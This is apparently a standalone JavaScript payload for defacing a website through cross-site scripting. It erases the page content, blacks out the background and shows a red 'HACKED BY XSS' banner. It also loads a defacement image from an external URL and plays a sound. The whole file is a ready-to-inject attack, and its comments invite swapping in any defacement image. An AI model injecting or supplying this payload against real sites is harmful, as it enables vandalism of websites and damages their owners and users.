// Clear existing page content
document.body.innerHTML = "";

// Add defacement content
document.body.style.backgroundColor = "black";  // Change background to black

// Create a warning message
let defaceMessage = document.createElement("div");
defaceMessage.style.position = "fixed";
defaceMessage.style.top = "50%";
defaceMessage.style.left = "50%";
defaceMessage.style.transform = "translate(-50%, -50%)";
defaceMessage.style.color = "red";
defaceMessage.style.fontSize = "40px";
defaceMessage.style.fontWeight = "bold";
defaceMessage.style.textAlign = "center";
defaceMessage.innerHTML = "⚠️ HACKED BY XSS ⚠️<br> Your Security is Weak!";
document.body.appendChild(defaceMessage);

// Optional: Add an image (replace URL with a defacement image)
let defaceImage = document.createElement("img");
defaceImage.src = "https://i.imgur.com/zfjDHmI.jpeg";  // Change to any defacement image URL
defaceImage.style.position = "fixed";
defaceImage.style.top = "10%";
defaceImage.style.left = "50%";
defaceImage.style.transform = "translateX(-50%)";
defaceImage.style.width = "300px";
document.body.appendChild(defaceImage);

// Optional: Play a sound
let audio = new Audio("https://www.myinstants.com/media/sounds/vine-boom.mp3");
audio.play();
